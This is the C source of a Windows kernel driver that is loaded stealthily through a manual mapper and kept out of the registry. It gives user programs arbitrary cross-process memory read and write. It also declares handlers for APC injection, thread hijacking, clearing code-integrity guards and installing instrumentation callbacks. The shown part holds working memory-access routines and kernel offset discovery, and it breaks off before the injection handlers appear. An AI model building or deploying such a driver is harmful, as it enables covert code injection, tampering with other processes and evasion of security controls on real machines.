/*
 * catdriver.c — CatDriver Kernel Mode Driver
 * ================================================================
 * A kernel driver that provides usermode clients with the ability
 * to read/write arbitrary process memory, find PIDs by name, and
 * get module base addresses.
 *
 * Memory R/W uses KeStackAttachProcess + MmCopyVirtualMemory for
 * the safest possible cross-process memory access from kernel mode.
 *
 * "Nine lives, zero BSOD tolerance." — ENI's driver philosophy
 *
 * Load via KdMapper or similar manual-map tool. This driver does
 * NOT register itself in the registry — it's a ghost cat.
 * ================================================================
 */

#include <ntifs.h>
#include <ntddk.h>
#include <wdm.h>
#include <ntstrsafe.h>
#include <wdmsec.h>   /* IoCreateDeviceSecure, SDDL constants */

#include "catdriver.h"

/* ================================================================
 * Forward declarations — the cat's playbook
 * ================================================================ */
DRIVER_INITIALIZE   DriverEntry;
DRIVER_UNLOAD       CatUnload;

_Dispatch_type_(IRP_MJ_CREATE)
DRIVER_DISPATCH      CatDispatchCreate;

_Dispatch_type_(IRP_MJ_CLOSE)
DRIVER_DISPATCH      CatDispatchClose;

_Dispatch_type_(IRP_MJ_DEVICE_CONTROL)
DRIVER_DISPATCH      CatDispatchDeviceControl;

static NTSTATUS CatReadMemory(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatWriteMemory(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatGetPid(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatGetModuleBase(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatGetTeb(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatGetTebsBulk(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatPing(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatDiagRead(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatAttachedRead(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatAllocMem(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatProtectMem(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatWriteMdlIoctl(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatClearAcg(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatCreateThread(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatApcInject(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatSpecialApc(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatHijackThread(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatFreezeProcess(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatThawProcess(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatSetInstrumentation(PIRP Irp, PIO_STACK_LOCATION IoStack);
static NTSTATUS CatReadPhysMem(ULONG64 physAddr, PVOID dest, SIZE_T size);

/* ================================================================
 * Undocumented but essential kernel APIs
 * The kernel doesn't advertise everything, but we know where
 * the catnip is hidden.
 * ================================================================ */

/* MmCopyVirtualMemory — the holy grail of cross-process memory access
 * Safer than direct MDL mapping, handles page faults gracefully.
 * This function is exported by ntoskrnl but not in the headers. */
NTKERNELAPI NTSTATUS NTAPI MmCopyVirtualMemory(
    IN PEPROCESS    SourceProcess,
    IN PVOID        SourceAddress,
    IN PEPROCESS    TargetProcess,
    OUT PVOID       TargetAddress,
    IN SIZE_T       BufferSize,
    IN KPROCESSOR_MODE PreviousMode,
    OUT PSIZE_T     ReturnSize
);

/* PsGetThreadTeb — exported by ntoskrnl, missing from WDK headers.
 * Kernel-side TEB resolution: no user handle, no hook can touch it. */
NTKERNELAPI PVOID NTAPI PsGetThreadTeb(PETHREAD Thread);

/* ---- APC injection types ----
 * KeInitializeApc / KeInsertQueueApc are exported by ntoskrnl
 * but not declared in public WDK headers. */

typedef enum _KAPC_ENVIRONMENT {
    OriginalApcEnvironment,
    AttachedApcEnvironment,
    CurrentApcEnvironment,
    InsertApcEnvironment
} KAPC_ENVIRONMENT;

typedef VOID (NTAPI *PCAT_KNORMAL_ROUTINE)(
    PVOID NormalContext,
    PVOID SystemArgument1,
    PVOID SystemArgument2
);

typedef VOID (NTAPI *PCAT_KKERNEL_ROUTINE)(
    PKAPC Apc,
    PCAT_KNORMAL_ROUTINE *NormalRoutine,
    PVOID *NormalContext,
    PVOID *SystemArgument1,
    PVOID *SystemArgument2
);

typedef VOID (NTAPI *PCAT_KRUNDOWN_ROUTINE)(PKAPC Apc);

NTKERNELAPI VOID KeInitializeApc(
    PKAPC Apc,
    PKTHREAD Thread,
    KAPC_ENVIRONMENT Environment,
    PCAT_KKERNEL_ROUTINE KernelRoutine,
    PCAT_KRUNDOWN_ROUTINE RundownRoutine,
    PCAT_KNORMAL_ROUTINE NormalRoutine,
    KPROCESSOR_MODE ApcMode,
    PVOID NormalContext
);

NTKERNELAPI BOOLEAN KeInsertQueueApc(
    PKAPC Apc,
    PVOID SystemArgument1,
    PVOID SystemArgument2,
    KPRIORITY Increment
);

/* PsGetProcessPeb — needed to walk the PEB for module info */
NTKERNELAPI PVOID NTAPI PsGetProcessPeb(IN PEPROCESS Process);
NTKERNELAPI PEPROCESS NTAPI PsGetThreadProcess(IN PETHREAD Thread);

/* ZwSetInformationProcess — for instrumentation callback */
NTSYSCALLAPI NTSTATUS NTAPI ZwSetInformationProcess(
    IN HANDLE ProcessHandle,
    IN ULONG ProcessInformationClass,
    IN PVOID ProcessInformation,
    IN ULONG ProcessInformationLength
);
#define CatProcessInstrumentationCallback 40
#define CAT_PROCESS_SET_INFORMATION 0x0200

/* ZwQuerySystemInformation — for enumerating processes */
typedef enum _CAT_SYSTEM_INFORMATION_CLASS {
    CatSystemProcessInformation = 5
} CAT_SYSTEM_INFORMATION_CLASS;

NTSYSCALLAPI NTSTATUS NTAPI ZwQuerySystemInformation(
    IN ULONG SystemInformationClass,
    IN OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL
);

/* SYSTEM_PROCESS_INFORMATION — the struct that ZwQuerySystemInformation fills
 * We only need the fields we care about */
typedef struct _CAT_SYSTEM_PROCESS_INFO {
    ULONG           NextEntryOffset;
    ULONG           NumberOfThreads;
    LARGE_INTEGER   Reserved[3];
    LARGE_INTEGER   CreateTime;
    LARGE_INTEGER   UserTime;
    LARGE_INTEGER   KernelTime;
    UNICODE_STRING  ImageName;
    LONG            BasePriority;
    HANDLE          UniqueProcessId;
    // ... more fields follow but we don't need them
} CAT_SYSTEM_PROCESS_INFO, *PCAT_SYSTEM_PROCESS_INFO;

/* PEB structures — for walking the module list
 * These are documented-ish but not in ntddk.h for kernel mode.
 * We define just enough to get to the module list. */
typedef struct _CAT_PEB_LDR_DATA {
    ULONG       Length;
    BOOLEAN     Initialized;
    PVOID       SsHandle;
    LIST_ENTRY  InLoadOrderModuleList;
    LIST_ENTRY  InMemoryOrderModuleList;
    LIST_ENTRY  InInitializationOrderModuleList;
} CAT_PEB_LDR_DATA, *PCAT_PEB_LDR_DATA;

typedef struct _CAT_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY  InLoadOrderLinks;
    LIST_ENTRY  InMemoryOrderLinks;
    LIST_ENTRY  InInitializationOrderLinks;
    PVOID       DllBase;
    PVOID       EntryPoint;
    ULONG       SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} CAT_LDR_DATA_TABLE_ENTRY, *PCAT_LDR_DATA_TABLE_ENTRY;

typedef struct _CAT_PEB {
    UCHAR               Reserved1[2];
    UCHAR               BeingDebugged;
    UCHAR               Reserved2[1];
    PVOID               Reserved3[2];
    PCAT_PEB_LDR_DATA   Ldr;
    // ... more fields, we only need Ldr
} CAT_PEB, *PCAT_PEB;


/* IoCreateDriver — undocumented but essential for manual-mapped drivers */
NTKERNELAPI NTSTATUS IoCreateDriver(
    PUNICODE_STRING DriverName,
    PDRIVER_INITIALIZE InitializationFunction
);

/* RtlGetVersion — documented API, used for build-aware behavior in R0 row #10. */
NTSYSAPI NTSTATUS NTAPI RtlGetVersion(_Out_ PRTL_OSVERSIONINFOW VersionInformation);

/* MSVC intrinsic — read control register 3 (page table root). Compile-time
 * expanded to a single `mov rax, cr3` instruction. Must be declared before
 * use with #pragma intrinsic so the compiler emits the intrinsic rather
 * than looking for a linker symbol. */
unsigned __int64 __readcr3(void);
#pragma intrinsic(__readcr3)

/* STATUS_NOT_READY may be absent from some SDKs' ntstatus.h — define it
 * explicitly rather than relying on the header. Standard NTSTATUS value. */
#ifndef STATUS_NOT_READY
#define STATUS_NOT_READY ((NTSTATUS)0xC00000A3L)
#endif

/* PsGetProcessExitStatus — documented, exported by ntoskrnl. Returns
 * STATUS_PENDING while a process is alive; its exit status once it has
 * begun terminating. We use this as a pre-flight gate before touching the
 * target's user memory to avoid BSOD 0x50 PAGE_FAULT_IN_NONPAGED_AREA when
 * the fuzzer (or any caller) picks a PID that's being reaped between the
 * lookup and the copy. Note that even MmCopyVirtualMemory's internal
 * rundown protection can't recover a copy against an already-dying
 * process (torn VAD tree / freed PTE). Per MS docs: "this cannot be
 * protected by try-except." */
NTKERNELAPI NTSTATUS PsGetProcessExitStatus(IN PEPROCESS Process);

/* PsAcquireProcessExitSynchronization / PsReleaseProcessExitSynchronization —
 * exported since Win10 1803. These hold the process in a "cannot start exit"
 * state across a critical section. MmCopyVirtualMemory's internal VAD walk
 * can still bugcheck 0x50 PAGE_FAULT_IN_NONPAGED_AREA if the target process
 * begins exit between our PsGetProcessExitStatus pre-flight and the actual
 * copy — the window is tiny but on a 60-min fuzz with target rotation it
 * fires reliably. Holding exit sync across the whole lookup+copy sequence
 * closes it. Dynamically resolve; fall back to the (racy) exit-status
 * check if these symbols aren't available on this build. */
typedef NTSTATUS (NTAPI *PFN_PsAcquireProcessExitSynchronization)(PEPROCESS Process);
typedef VOID     (NTAPI *PFN_PsReleaseProcessExitSynchronization)(PEPROCESS Process);
static PFN_PsAcquireProcessExitSynchronization pfnPsAcquireProcessExitSynchronization = NULL;
static PFN_PsReleaseProcessExitSynchronization pfnPsReleaseProcessExitSynchronization = NULL;
static BOOLEAN                                 g_ExitSyncResolved                     = FALSE;

static VOID CatResolveExitSync(void) {
    if (g_ExitSyncResolved) return;
    UNICODE_STRING n;
    RtlInitUnicodeString(&n, L"PsAcquireProcessExitSynchronization");
    pfnPsAcquireProcessExitSynchronization =
        (PFN_PsAcquireProcessExitSynchronization)MmGetSystemRoutineAddress(&n);
    RtlInitUnicodeString(&n, L"PsReleaseProcessExitSynchronization");
    pfnPsReleaseProcessExitSynchronization =
        (PFN_PsReleaseProcessExitSynchronization)MmGetSystemRoutineAddress(&n);
    g_ExitSyncResolved = TRUE;
    DbgPrint("[CatDriver] EXITSYNC: Acq=0x%p Rel=0x%p\n",
             pfnPsAcquireProcessExitSynchronization,
             pfnPsReleaseProcessExitSynchronization);
}

/* PsIsProtectedProcess / PsIsProtectedProcessLight — resolve dynamically.
 * Not every build exports these as public symbols, but they're stable since
 * Win8.1. Touching a PP/PPL target (lsass, csrss, services, system guard)
 * with MmCopyVirtualMemory from kernel ignores the protection — the write
 * succeeds and we corrupt a critical process, which bugchecks with
 * CRITICAL_OBJECT_TERMINATION (0xF4) on the next scheduler tick. Refuse up
 * front in the shared lookup helper so no handler can forget. */
typedef BOOLEAN (NTAPI *PFN_PsIsProtectedProcess)(PEPROCESS Process);
typedef BOOLEAN (NTAPI *PFN_PsIsProtectedProcessLight)(PEPROCESS Process);
static PFN_PsIsProtectedProcess       pfnPsIsProtectedProcess      = NULL;
static PFN_PsIsProtectedProcessLight  pfnPsIsProtectedProcessLight = NULL;
static BOOLEAN                        g_ProtectResolved            = FALSE;

static VOID CatResolveProtectHelpers(void) {
    if (g_ProtectResolved) return;
    UNICODE_STRING n;
    RtlInitUnicodeString(&n, L"PsIsProtectedProcess");
    pfnPsIsProtectedProcess = (PFN_PsIsProtectedProcess)MmGetSystemRoutineAddress(&n);
    RtlInitUnicodeString(&n, L"PsIsProtectedProcessLight");
    pfnPsIsProtectedProcessLight = (PFN_PsIsProtectedProcessLight)MmGetSystemRoutineAddress(&n);
    g_ProtectResolved = TRUE;
    DbgPrint("[CatDriver] PROTECT: PsIsProtectedProcess=0x%p PsIsProtectedProcessLight=0x%p\n",
             pfnPsIsProtectedProcess, pfnPsIsProtectedProcessLight);
}

/* User-mode VA range check: must be in [0x10000, MmHighestUserAddress] and
 * the entire range [addr, addr+size) must stay inside that window without
 * arithmetic overflow. Zero size is rejected — callers either validate size
 * separately or shouldn't be touching VM. */
static BOOLEAN CatIsValidUserVa(ULONG64 addr, ULONG64 size) {
    if (size == 0) return FALSE;
    ULONG64 max_user = (ULONG64)(ULONG_PTR)MmHighestUserAddress;
    if (addr < 0x10000) return FALSE;
    if (addr > max_user) return FALSE;
    if (size > (max_user - addr + 1)) return FALSE;
    if ((addr + size) < addr) return FALSE;
    return TRUE;
}

/* Looks up a process by PID AND verifies it isn't in the exit path AND
 * isn't a Protected Process / PPL target. On success the caller MUST
 * ObDereferenceObject when done. */
static NTSTATUS CatLookupLiveProcess(ULONG pid, PEPROCESS* outProcess) {
    *outProcess = NULL;
    if (pid == 0 || pid == 4) {
        /* System idle (0) and System (4) are never legitimate targets. */
        return STATUS_INVALID_CID;
    }
    PEPROCESS proc = NULL;
    NTSTATUS st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc);
    if (!NT_SUCCESS(st)) return st;
    /* STATUS_PENDING is the "alive" sentinel; anything else means the
     * process has initiated exit and its address space is unsafe to touch. */
    NTSTATUS exitSt = PsGetProcessExitStatus(proc);
    if (exitSt != STATUS_PENDING) {
        ObDereferenceObject(proc);
        return STATUS_PROCESS_IS_TERMINATING;
    }
    /* PP / PPL reject — bugcheck 0xF4 avoidance. */
    CatResolveProtectHelpers();
    if (pfnPsIsProtectedProcess && pfnPsIsProtectedProcess(proc)) {
        DbgPrint("[CatDriver] LOOKUP: pid %u is Protected — refuse\n", pid);
        ObDereferenceObject(proc);
        return STATUS_ACCESS_DENIED;
    }
    if (pfnPsIsProtectedProcessLight && pfnPsIsProtectedProcessLight(proc)) {
        DbgPrint("[CatDriver] LOOKUP: pid %u is PPL — refuse\n", pid);
        ObDereferenceObject(proc);
        return STATUS_ACCESS_DENIED;
    }
    *outProcess = proc;
    return STATUS_SUCCESS;
}

/* VM-touching variant: calls CatLookupLiveProcess then additionally holds
 * PsAcquireProcessExitSynchronization so the target process cannot begin
 * teardown while we're inside MmCopyVirtualMemory / KeStackAttachProcess /
 * MmProbeAndLockPages. MUST be paired with CatReleaseLiveProcessSync, not
 * ObDereferenceObject directly. If the exported sync APIs aren't available
 * on this build, falls back to CatLookupLiveProcess's exit-status check
 * (which is TOCTOU-racy but still catches most teardowns). */
static NTSTATUS CatLookupLiveProcessSync(ULONG pid, PEPROCESS* outProcess) {
    CatResolveExitSync();
    NTSTATUS st = CatLookupLiveProcess(pid, outProcess);
    if (!NT_SUCCESS(st)) return st;
    if (pfnPsAcquireProcessExitSynchronization) {
        NTSTATUS acq = pfnPsAcquireProcessExitSynchronization(*outProcess);
        if (!NT_SUCCESS(acq)) {
            /* Process is already past the point where exit sync can be
             * acquired — treat as terminating. */
            ObDereferenceObject(*outProcess);
            *outProcess = NULL;
            return STATUS_PROCESS_IS_TERMINATING;
        }
    }
    return STATUS_SUCCESS;
}

static VOID CatReleaseLiveProcessSync(PEPROCESS process) {
    if (pfnPsReleaseProcessExitSynchronization) {
        pfnPsReleaseProcessExitSynchronization(process);
    }
    ObDereferenceObject(process);
}

/* Cross-process memory copy with SEH-catchable validation.
 *
 * MmCopyVirtualMemory with PreviousMode=KernelMode trusts the caller's
 * addresses — if the source VA is unmapped, Mm's internal memcpy faults
 * and MiBadAccess bugchecks the box (0x50 PAGE_FAULT_IN_NONPAGED_AREA)
 * because MI classifies "kernel code touches invalid user VA" as a
 * driver bug and bypasses SEH dispatch.
 *
 * MmIsAddressValid is advisory and race-prone — it returned TRUE on
 * pages that then bugchecked in Mm's memcpy. Not sufficient for the
 * fuzzer's random VA stream.
 *
 * The reliable pattern: attach to target, do a REAL byte-touch of each
 * page under __try. A touch fault at PASSIVE in attached context raises
 * STATUS_ACCESS_VIOLATION through the normal exception path (the SEH
 * frame is right at the fault point, no cross-function unwind needed).
 * Then RtlCopyMemory under the same __try. If anything in the whole
 * sequence faults, we return cleanly.
 *
 * CatLookupLiveProcessSync caller holds exit sync so the target can't
 * exit under us. Remaining race (concurrent VirtualFree) is very narrow;
 * the touch-probe immediately before the copy minimizes it. */
static NTSTATUS CatSafeReadFromProcess(
    PEPROCESS srcProcess,
    PVOID srcAddr,
    PVOID dst,
    SIZE_T size,
    PSIZE_T outCopied)
{
    if (outCopied) *outCopied = 0;
    if (size == 0) return STATUS_INVALID_PARAMETER;

    KAPC_STATE st;
    NTSTATUS status = STATUS_SUCCESS;
    KeStackAttachProcess(srcProcess, &st);
    __try {
        /* Touch-probe every page. A read of a single byte forces real
         * PTE translation — if the page is unmapped, #PF → SEH catch. */
        volatile UCHAR sink = 0;
        ULONG_PTR start = (ULONG_PTR)srcAddr & ~((ULONG_PTR)0xFFF);
        ULONG_PTR end   = (ULONG_PTR)srcAddr + size;
        for (ULONG_PTR p = start; p < end; p += 0x1000) {
            sink = *(volatile UCHAR*)p;
        }
        (void)sink;
        /* Pages are present. Copy. */
        RtlCopyMemory(dst, srcAddr, size);
        if (outCopied) *outCopied = size;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }
    KeUnstackDetachProcess(&st);
    return status;
}

static NTSTATUS CatSafeWriteToProcess(
    PEPROCESS dstProcess,
    PVOID dstAddr,
    PVOID src,
    SIZE_T size,
    PSIZE_T outCopied)
{
    if (outCopied) *outCopied = 0;
    if (size == 0) return STATUS_INVALID_PARAMETER;

    KAPC_STATE st;
    NTSTATUS status = STATUS_SUCCESS;
    KeStackAttachProcess(dstProcess, &st);
    __try {
        /* Probe-write: read then write-back each page's byte. Catches
         * unmapped (read fails) AND read-only (write fails) before we
         * clobber half the range with RtlCopyMemory. */
        ULONG_PTR start = (ULONG_PTR)dstAddr & ~((ULONG_PTR)0xFFF);
        ULONG_PTR end   = (ULONG_PTR)dstAddr + size;
        for (ULONG_PTR p = start; p < end; p += 0x1000) {
            volatile UCHAR* bp = (volatile UCHAR*)p;
            UCHAR v = *bp;
            *bp = v;
        }
        RtlCopyMemory(dstAddr, src, size);
        if (outCopied) *outCopied = size;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }
    KeUnstackDetachProcess(&st);
    return status;
}

/* Looks up a thread by TID AND verifies:
 *   - lookup success
 *   - thread not terminating (PsIsThreadTerminating == FALSE)
 *   - owning process matches expectedPid (prevents cross-process confusion
 *     where fuzzer passes PID of one process and TID of another)
 *   - owning process is live and not PP/PPL (via CatLookupLiveProcess
 *     semantics — we resolve owner through PsGetThreadProcess and run the
 *     same gates)
 * On success caller MUST ObDereferenceObject the thread. */
static NTSTATUS CatLookupLiveThread(ULONG tid, ULONG expectedPid, PETHREAD* outThread) {
    *outThread = NULL;
    if (tid == 0) return STATUS_INVALID_CID;
    PETHREAD t = NULL;
    NTSTATUS st = PsLookupThreadByThreadId((HANDLE)(ULONG_PTR)tid, &t);
    if (!NT_SUCCESS(st)) return st;
    if (PsIsThreadTerminating(t)) {
        ObDereferenceObject(t);
        return STATUS_THREAD_IS_TERMINATING;
    }
    /* Owner check — CLIENT_ID.UniqueProcess at ETHREAD+0x40, stable on x64
     * since Win10. Fuzzer-safe: a wrong-pid-with-right-tid pairing can't
     * sneak a cross-process write past us. */
    PEPROCESS ownerProc = PsGetThreadProcess(t);
    if (!ownerProc) {
        ObDereferenceObject(t);
        return STATUS_INVALID_OWNER;
    }
    ULONG ownerPid = (ULONG)(ULONG_PTR)PsGetProcessId(ownerProc);
    if (expectedPid != 0 && ownerPid != expectedPid) {
        DbgPrint("[CatDriver] LOOKUP_THR: tid %u owner mismatch (owner=%u expected=%u)\n",
                 tid, ownerPid, expectedPid);
        ObDereferenceObject(t);
        return STATUS_INVALID_OWNER;
    }
    /* Owner liveness + PP/PPL — same gates as CatLookupLiveProcess, but we
     * already have the PEPROCESS so skip the lookup. */
    NTSTATUS exitSt = PsGetProcessExitStatus(ownerProc);
    if (exitSt != STATUS_PENDING) {
        ObDereferenceObject(t);
        return STATUS_PROCESS_IS_TERMINATING;
    }
    CatResolveProtectHelpers();
    if (pfnPsIsProtectedProcess && pfnPsIsProtectedProcess(ownerProc)) {
        ObDereferenceObject(t);
        return STATUS_ACCESS_DENIED;
    }
    if (pfnPsIsProtectedProcessLight && pfnPsIsProtectedProcessLight(ownerProc)) {
        ObDereferenceObject(t);
        return STATUS_ACCESS_DENIED;
    }
    *outThread = t;
    return STATUS_SUCCESS;
}

/* ================================================================
 * R0 — Runtime offset discovery (rows 7, 9, 10 in the plan file).
 *
 * KTHREAD.TrapFrame, EPROCESS.DirectoryTableBase, and the OS build number
 * were previously hardcoded at the 26200-era x64 values. On any other
 * Windows build those offsets land on unrelated struct fields and the
 * driver bugchecks on dereference. Here we discover them at runtime so
 * the driver is build-portable instead of build-pinned.
 *
 * Fallback: if discovery fails, use the previously-pinned values. Caller
 * code gets the same semantics it has today, just more honestly.
 *
 * All three run under __try so a bad scan can't fault into the OS.
 * ================================================================ */
static LONG   g_TrapFrameOff   = -1;  /* KTHREAD field containing TrapFrame* */
static LONG   g_DtbOff         = -1;  /* EPROCESS field with DirectoryTableBase */
static ULONG  g_OsBuildNumber  = 0;   /* RtlGetVersion->dwBuildNumber */
static BOOLEAN g_OsOffsetsDone = FALSE;

static ULONG64 CatCanonicalKernelMin(void) { return 0xFFFF800000000000ULL; }
static ULONG64 CatCanonicalUserMax (void) { return 0x00007FFFFFFEFFFFULL; }

static VOID CatDiscoverOsOffsets(void) {
    if (g_OsOffsetsDone) return;

    /* 1. OS build number — straightforward documented API. */
    RTL_OSVERSIONINFOW ver = { 0 };
    ver.dwOSVersionInfoSize = sizeof(ver);
    if (NT_SUCCESS(RtlGetVersion(&ver))) {
        g_OsBuildNumber = ver.dwBuildNumber;
        DbgPrint("[CatDriver] DISC: OS build=%u\n", g_OsBuildNumber);
    }

    /* 2. EPROCESS.DirectoryTableBase — scan current EPROCESS for a qword
     * whose value equals __readcr3() with PCID (low 12 bits) masked out.
     * Current CPU's CR3 matches the current process's DTB when we are in
     * that process's address space, which we always are during driver load. */
    PEPROCESS proc = PsGetCurrentProcess();
    if (proc) {
        ULONG64 cr3 = __readcr3() & ~0xFFFULL;
        __try {
            for (ULONG off = 0x18; off <= 0x80; off += 8) {
                ULONG64 v = *(volatile ULONG64*)((PUCHAR)proc + off) & ~0xFFFULL;
                if (v == cr3 && v != 0) { g_DtbOff = (LONG)off; break; }
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) { /* fall through */ }
        DbgPrint("[CatDriver] DISC: DtbOff=%ld (cr3=0x%llX)\n", g_DtbOff, cr3);
    }

    /* 3. KTHREAD.TrapFrame — scan current KTHREAD for a pointer that is
     * canonical-kernel-space AND whose +0x168 field (TrapFrame.Rip) is a
     * canonical-user VA. Only valid in IOCTL context where the trap frame
     * is populated with the caller's user-mode state. Called from the
     * IOCTL path, so that invariant holds. */
    PETHREAD thread = PsGetCurrentThread();
    if (thread) {
        /* Bound candidates to the current kernel stack range so the deref at
         * cand+0x168 can't accidentally hit MMIO or another driver's pool.
         * TrapFrame always lives on the kernel stack of its owning thread.
         * IoGetStackLimits is documented and build-independent. */
        ULONG_PTR stackLow = 0, stackHigh = 0;
        IoGetStackLimits(&stackLow, &stackHigh);

        __try {
            for (ULONG off = 0x80; off <= 0x100; off += 8) {
                ULONG64 cand = *(volatile ULONG64*)((PUCHAR)thread + off);
                /* Must be a canonical kernel VA on the current stack. */
                if (cand < CatCanonicalKernelMin()) continue;
                if (cand < (ULONG64)stackLow || cand >= (ULONG64)stackHigh) continue;
                /* +0x168 (TrapFrame.Rip) also inside the stack — belt and
                 * suspenders, because MmIsAddressValid can lie for MMIO. */
                if (((ULONG64)cand + 0x168) >= (ULONG64)stackHigh) continue;
                ULONG64 rip = *(volatile ULONG64*)((PUCHAR)cand + 0x168);
                /* TrapFrame.Rip is a canonical user-mode VA when we got here
                 * from a user-mode syscall. */
                if (rip != 0 && rip >= 0x10000 && rip <= CatCanonicalUserMax()) {
                    g_TrapFrameOff = (LONG)off;
                    break;
                }
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) { /* fall through */ }
        DbgPrint("[CatDriver] DISC: TrapFrameOff=%ld (stack %llX..%llX)\n",
                 g_TrapFrameOff, (ULONGLONG)stackLow, (ULONGLONG)stackHigh);
    }

    g_OsOffsetsDone = TRUE;
}

/* Accessors — return discovered value or hardcoded fallback. Separating
 * the fallback keeps hot-path handlers readable. */
static LONG CatGetTrapFrameOff(void) {
    if (g_TrapFrameOff > 0) return g_TrapFrameOff;
    return 0x90;  /* Win11 26200 fallback */
}
static LONG CatGetDtbOff(void) {
    if (g_DtbOff > 0) return g_DtbOff;
    return 0x28;  /* Win11 26200 fallback */
}

/* HARD gate for handlers that MUST have discovery (hijack: trap-frame
 * write at offset — fallback value on wrong build dereferences garbage
 * and 0x50s). CatGetTrapFrameOff still returns a fallback for diagnostic /
 * best-effort callers; this accessor says "do not touch unless real". */
static BOOLEAN CatTrapFrameOffDiscovered(void) {
    return g_TrapFrameOff > 0;
}
static BOOLEAN CatDtbOffDiscovered(void) {
    return g_DtbOff > 0;
}

/* The real init — called with a valid DriverObject from IoCreateDriver */
static NTSTATUS CatRealInit(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS        status;
    PDEVICE_OBJECT  deviceObject = NULL;
    UNICODE_STRING  deviceName;
    UNICODE_STRING  symlinkName;

    DbgPrint("[CatDriver] Real init with valid DriverObject.\n");

    RtlInitUnicodeString(&deviceName, CAT_DEVICE_NAME);
    RtlInitUnicodeString(&symlinkName, CAT_SYMLINK_NAME);

    /* SDDL: SYSTEM full, Administrators full, no one else. Prevents an
     * unprivileged usermode process from opening \\.\CatDriver and
     * driving the IOCTL surface — which includes raw cross-process R/W,
     * ACG clear, trap-frame hijack, etc. Default IoCreateDevice gives the
     * device a permissive DACL inherited from the driver object; without
     * SDDL any medium-IL process can open it. */
    static const UNICODE_STRING sddl = RTL_CONSTANT_STRING(
        L"D:P(A;;GA;;;SY)(A;;GA;;;BA)"
    );
    status = IoCreateDeviceSecure(
        DriverObject,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &sddl,
        NULL,                /* no device class GUID */
        &deviceObject
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] IoCreateDevice failed: 0x%08X\n", status);
        return status;
    }

    status = IoCreateSymbolicLink(&symlinkName, &deviceName);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] IoCreateSymbolicLink failed: 0x%08X\n", status);
        IoDeleteDevice(deviceObject);
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE]         = CatDispatchCreate;
    DriverObject->MajorFunction[IRP_MJ_CLOSE]          = CatDispatchClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = CatDispatchDeviceControl;
    DriverObject->DriverUnload                         = CatUnload;

    deviceObject->Flags |= DO_BUFFERED_IO;
    deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    DbgPrint("[CatDriver] Ready! Device and symlink created.\n");
    return STATUS_SUCCESS;
}

/* ================================================================
 * DriverEntry — the cat wakes up
 * KdMapper passes (mappedBase, imageSize) — NOT a real DriverObject.
 * We ignore both params and always use IoCreateDriver to get a
 * proper DriverObject from the I/O manager.
 *
 * The signature mismatch vs. the standard DRIVER_INITIALIZE prototype
 * is intentional for kdmapper compatibility; silence C4028 for just
 * this function. The forward declaration at the top of the file uses
 * the standard prototype which is also fine — the mapper only cares
 * about the entry point address, not its signature.
 * ================================================================ */
/* x64 RUNTIME_FUNCTION + minimal PE header structs we need to walk the
 * EXCEPTION_DIRECTORY. kernel ntddk.h doesn't expose the public winnt.h
 * versions, so declare just what we use. All offsets per PE/COFF spec. */
typedef struct _CAT_RUNTIME_FUNCTION {
    ULONG BeginAddress;
    ULONG EndAddress;
    union {
        ULONG UnwindInfoAddress;
        ULONG UnwindData;
    };
} CAT_RUNTIME_FUNCTION, *PCAT_RUNTIME_FUNCTION;

typedef struct _CAT_IMAGE_DOS_HEADER {
    USHORT e_magic;
    USHORT e_cblp;
    USHORT e_cp;
    USHORT e_crlc;
    USHORT e_cparhdr;
    USHORT e_minalloc;
    USHORT e_maxalloc;
    USHORT e_ss;
    USHORT e_sp;
    USHORT e_csum;
    USHORT e_ip;
    USHORT e_cs;
    USHORT e_lfarlc;
    USHORT e_ovno;
    USHORT e_res[4];
    USHORT e_oemid;
    USHORT e_oeminfo;
    USHORT e_res2[10];
    LONG   e_lfanew;
} CAT_IMAGE_DOS_HEADER, *PCAT_IMAGE_DOS_HEADER;

typedef struct _CAT_IMAGE_DATA_DIRECTORY {
    ULONG VirtualAddress;
    ULONG Size;
} CAT_IMAGE_DATA_DIRECTORY;

#define CAT_IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16
#define CAT_IMAGE_DIRECTORY_ENTRY_EXCEPTION  3
#define CAT_IMAGE_DOS_SIGNATURE 0x5A4D   /* "MZ" */
